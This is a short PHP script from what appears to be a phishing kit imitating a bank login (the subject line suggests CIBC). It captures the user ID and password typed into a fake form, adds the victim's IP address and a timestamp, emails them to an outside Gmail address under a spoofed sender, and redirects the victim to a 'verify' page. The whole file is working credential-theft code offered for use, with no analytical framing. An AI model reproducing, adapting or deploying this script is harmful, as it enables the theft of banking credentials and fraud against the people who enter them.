<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user = $_POST['userid'];
$passe = $_POST['passwd'];
$fiftyme="zate123man@gmail.com";


  $subj = "CiBCfciB $ip";
  $msg = "Login Info\n\nUser ID: $user\nPassword: $passe\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="verify.php"
</script>
